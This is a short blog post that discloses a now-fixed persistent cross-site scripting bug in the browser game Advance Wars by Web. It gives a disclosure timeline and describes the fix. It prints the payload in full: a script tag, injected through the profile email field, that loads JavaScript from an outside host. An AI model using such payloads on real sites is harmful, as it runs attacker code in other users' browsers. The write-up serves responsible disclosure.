---
layout: post
title: AWBW Persistent XSS &mdash; Sami is my Hero
---

# AWBW Persistent XSS &mdash; Sami is my Hero

This post's a short one, I just feel like recording a small vulnerability I
found and reported. I mostly like my Proof of Concept, and frankly that's the
real reason I'm writing this.

In fact, skip reading the post, just check out the [Proof of Concept](https://web.archive.org/web/20201201044101/https://awbw.amarriner.com/profile.php?username=testxs).

## Background

#### AWBW

Advance Wars by Web (aka [AWBW](https://awbw.amarriner.com/)) is a web-based turn-based strategy game based on nintendo's Advance Wars game. You can read more about that [here](https://awbw.amarriner.com/guide.php).

You can tell, just by clicking around on it, that it's a big pile of php. The "guide.php" in that url is also a pretty big hint.

I don't play, but when a friend linked it to me, I saw ".php", which makes my brain immediately want to start typing SQL injection and XSS payloads into the nearest text input.

#### XSS

If you don't know what XSS is, [Wikipedia](https://en.wikipedia.org/wiki/Cross-site_scripting) has you covered.

Perhaps the most famous XSS in existence is the [Samy Worm](https://en.wikipedia.org/wiki/Samy_%28computer_worm%29), which spread to over a million MySpace users.

## The Persistent XSS

So, let's start with the proof of concept I created and sent to the AWBW team:

[https://awbw.amarriner.com/profile.php?username=testxs](https://web.archive.org/web/20201201044101/https://awbw.amarriner.com/profile.php?username=testxs)

(web.archive.org link, since it has been fixed)

So, what was the exploit? Entering `></td></tr><script src="https://s.ek.gs/s.js"><` into the email field.

And also checking the "display email" tickbox.

### Timeline and Fix

The timeline is a bit fuzzy because I was not informed when they fixed it. I believe it's roughly the following though:

- 2020-12-01 &mdash; I find the persistent XSS above, and write the PoC shown above.
- 2020-12-01 &mdash; I email the AWBW admins with the PoC and a clear description of the bug.
- 2021-04-20 &mdash; I notice it's fixed. I did not ever receive an email response. There is no changelog entry.

How did they fix it?

They made it so the "display email" checkbox no longer displays your email anywhere, as far as I can tell. You can still enter a persistent XSS onto your own settings page via the email input, but you can't get anyone else to view it.

They did also blank out the email field for my test account.

## Conclusion

Typing into text fields is fun, but most of all Samy is my hero.
